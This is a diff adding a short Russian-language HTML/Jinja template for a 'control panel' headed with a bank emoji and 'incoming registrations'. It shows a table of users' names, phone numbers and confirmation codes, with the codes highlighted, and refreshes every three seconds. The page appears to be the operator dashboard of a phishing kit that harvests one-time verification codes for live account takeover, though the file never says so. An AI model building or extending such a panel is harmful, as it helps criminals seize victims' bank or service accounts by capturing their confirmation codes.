@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="3"> <!-- Обновление каждые 3 секунды -->
+    <title>Панель управления</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; padding: 40px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #2d2d2d; }
+        th, td { padding: 15px; border: 1px solid #444; text-align: left; }
+        th { background: #007bff; }
+        .code-highlight { color: #00ff00; font-weight: bold; font-size: 1.2em; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+    <h1>🏦 Входящие регистрации</h1>
+    <p>Страница обновляется автоматически каждые 3 секунды</p>
+    <table>
+        <thead>
+            <tr>
+                <th>Пользователь</th>
+                <th>Номер телефона</th>
+                <th>Код подтверждения</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for user in users %}
+            <tr>
+                <td>{{ user[0] }}</td>
+                <td>{{ user[1] }}</td>
+                <td class="code-highlight">{{ user[2] }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</body>
+</html>
